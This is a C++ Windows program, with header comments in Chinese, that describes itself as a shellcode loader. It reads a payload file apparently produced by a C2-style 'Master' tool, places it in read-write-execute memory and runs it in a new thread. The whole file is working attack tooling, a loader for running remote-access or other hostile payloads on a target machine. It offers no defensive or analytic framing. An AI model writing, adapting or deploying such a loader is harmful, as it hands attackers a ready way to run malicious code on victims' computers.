#include <windows.h>
#include <cstdio>
#include <vector>
#include <string>

/**
 * ShellCode Loader
 * ---------------------------
 * 功能: 从当前目录下的 "Client.bin" 文件读取 ShellCode 并执行。
 * 
 * 使用方法:
 * 1. 使用 Master 生成 "ShellCode" (将生成 Formidable_Client.bin)
 * 2. 将生成的 .bin 文件重命名为 "Client.bin"
 * 3. 将本程序 (Loader.exe) 和 Client.bin 放在同一目录下
 * 4. 运行 Loader.exe
 */

int main() {
    // 0. 获取当前目录
    wchar_t szPath[MAX_PATH];
    GetModuleFileNameW(NULL, szPath, MAX_PATH);
    std::wstring currentDir = szPath;
    currentDir = currentDir.substr(0, currentDir.find_last_of(L"\\/"));
    std::wstring binPath = currentDir + L"\\Client.bin";

    printf("[*] ShellCode Loader Started.\n");
    printf("[*] Looking for ShellCode at: %ws\n", binPath.c_str());

    // 1. 读取 ShellCode 文件
    HANDLE hFile = CreateFileW(binPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        // 尝试寻找 Formidable_Client.bin
        binPath = currentDir + L"\\Formidable_Client.bin";
        printf("[*] Client.bin not found, trying: %ws\n", binPath.c_str());
        hFile = CreateFileW(binPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            printf("[-] Failed to open ShellCode file (Client.bin or Formidable_Client.bin). Error: %lu\n", GetLastError());
            return 1;
        }
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == 0) {
        printf("[-] ShellCode file is empty.\n");
        CloseHandle(hFile);
        return 1;
    }

    std::vector<unsigned char> shellcode(fileSize);
    DWORD bytesRead;
    if (!ReadFile(hFile, shellcode.data(), fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        printf("[-] Failed to read file. Error: %lu\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }
    CloseHandle(hFile);
    
    printf("[+] ShellCode loaded. Size: %lu bytes\n", fileSize);

    // 2. 分配可执行内存
    void* execMem = VirtualAlloc(0, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!execMem) {
        printf("[-] VirtualAlloc failed: %lu\n", GetLastError());
        return 1;
    }
    printf("[+] Memory allocated at: %p\n", execMem);

    // 3. 复制 ShellCode 到内存
    memcpy(execMem, shellcode.data(), fileSize);
    printf("[+] Shellcode copied.\n");

    // 4. 执行 ShellCode
    printf("[*] Executing...\n");
    
    // 方法 A: 创建线程执行
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)execMem, NULL, 0, NULL);
    if (hThread) {
        printf("[+] Thread created. ID: %lu\n", GetThreadId(hThread));
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    } else {
        printf("[-] CreateThread failed: %lu\n", GetLastError());
    }

    printf("[+] Execution finished.\n");
    VirtualFree(execMem, 0, MEM_RELEASE);
    return 0;
}
